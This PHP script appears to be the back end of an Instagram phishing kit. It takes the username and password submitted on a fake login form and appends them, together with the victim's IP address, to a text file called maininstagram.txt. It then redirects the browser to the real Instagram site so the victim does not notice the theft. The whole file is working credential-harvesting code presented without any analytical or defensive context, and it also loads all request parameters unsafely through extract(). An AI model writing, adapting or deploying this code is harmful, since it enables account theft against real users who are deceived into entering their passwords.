<?php
        extract($_REQUEST);
		
		$ip = getenv("REMOTE_ADDR");
		$hostname = gethostbyaddr($ip);
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		
        $file=fopen("maininstagram.txt","a");

        fwrite($file,"Email=>");
        fwrite($file, $uname ."\n");
        fwrite($file,"Password=>");
        fwrite($file, $password ."\n");
		fwrite($file,"IP=>");
        fwrite($file, $ip ."\n\n");

        fclose($file);
        header("location: https://www.instagram.com");

?>